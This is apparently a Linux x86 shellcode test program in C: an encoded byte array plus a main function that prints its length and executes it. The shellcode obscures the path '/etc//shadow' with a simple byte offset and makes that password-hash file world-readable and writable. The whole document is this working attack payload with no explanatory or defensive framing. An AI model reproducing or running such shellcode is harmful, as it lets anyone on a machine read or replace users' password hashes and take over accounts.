#include <stdio.h>

char code[]= \
"\x31\xc0\x31\xc9\x50\xb0\x08\xbf\x72\x75\x80\x88\x57\xbf\x40\x40\x84\x79\x57\xbf\x40\x76\x85\x74\x57\x89\xe3\xb1\x0c\x80\x6c\x0c\xff\x11\xe2\xf9\x66\xb9\xff\xff\x66\x81\xe9\x49\xfe\x04\x07\xcd\x80\x2c\x0e\xcd\x80";


int main(){
     printf("Length of the Shellcode:  %d\n", strlen(code));
     
     (*(void  (*)()) code)();
     return 0;
}




